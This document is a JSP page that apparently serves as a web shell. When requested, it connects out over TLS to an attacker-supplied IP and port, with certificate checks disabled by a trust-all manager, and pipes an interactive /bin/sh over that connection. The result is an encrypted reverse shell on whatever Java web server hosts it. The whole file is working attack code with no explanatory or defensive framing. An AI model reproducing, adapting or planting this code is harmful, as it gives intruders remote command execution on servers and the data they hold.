<%@ page import="java.io.*, java.net.*, javax.net.ssl.*, java.security.*" %>
<%
    response.setContentType("text/plain");
    response.setBufferSize(0);

    String targetIp = request.getParameter("ip");
    if (targetIp == null || targetIp.isEmpty()) {
        targetIp = "127.0.0.1";
    }

    int targetPort = 222;
    try {
        String portParam = request.getParameter("port");
        if (portParam != null) {
            int p = Integer.parseInt(portParam);
            if (p > 0 && p <= 65535) {
                targetPort = p;
            }
        }
    } catch (Exception ignored) {}

    if (!targetIp.matches("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")) {
        return;
    }

    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}

    SSLSocket socket = null;
    Process process = null;

    try {
        // Create SSL context with default trust manager (trust all)
        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, new javax.net.ssl.TrustManager[] {
            new javax.net.ssl.X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
            }
        }, new java.security.SecureRandom());

        SSLSocketFactory factory = sslContext.getSocketFactory();

        socket = (SSLSocket) factory.createSocket();
        socket.connect(new java.net.InetSocketAddress(targetIp, targetPort), 5000);
        socket.setSoTimeout(0);
        socket.startHandshake();

        String shellCmd = "/bin/sh";
        ProcessBuilder pb = new ProcessBuilder(shellCmd, "-i");
        pb.redirectErrorStream(true);
        process = pb.start();

        InputStream socketIn = new BufferedInputStream(socket.getInputStream());
        OutputStream socketOut = new BufferedOutputStream(socket.getOutputStream());

        InputStream processIn = new BufferedInputStream(process.getInputStream());
        OutputStream processOut = new BufferedOutputStream(process.getOutputStream());

        Thread t1 = new Thread(() -> {
            byte[] buf = new byte[2048];
            int len;
            try {
                while ((len = socketIn.read(buf)) != -1) {
                    processOut.write(buf, 0, len);
                    processOut.flush();
                }
            } catch (IOException ignored) {}
        });
        t1.setDaemon(true);

        Thread t2 = new Thread(() -> {
            byte[] buf = new byte[2048];
            int len;
            try {
                while ((len = processIn.read(buf)) != -1) {
                    socketOut.write(buf, 0, len);
                    socketOut.flush();
                }
            } catch (IOException ignored) {}
        });
        t2.setDaemon(true);

        t1.start();
        t2.start();

        process.waitFor();

    } catch (Exception ignored) {
    } finally {
        try { if (process != null) process.destroy(); } catch (Exception ignored) {}
        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
    }
%>